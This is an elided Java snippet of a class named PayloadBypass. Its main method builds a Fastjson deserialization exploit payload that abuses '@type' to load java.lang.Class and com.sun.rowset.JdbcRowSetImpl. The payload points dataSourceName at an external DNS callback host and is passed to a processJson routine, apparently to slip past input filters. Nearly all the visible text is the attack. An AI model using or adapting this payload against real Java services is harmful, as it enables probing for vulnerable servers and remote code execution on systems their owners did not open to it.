...
public class PayloadBypass {
    public static String processJson(String inputJson,boolean isParam) {
        try {
    ...
    public static void main(String[] args) {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"dns://113.x2nx.eyes.sh/miao1\",\"autocommit\":true}}";
        String s = processJson(payload,true);
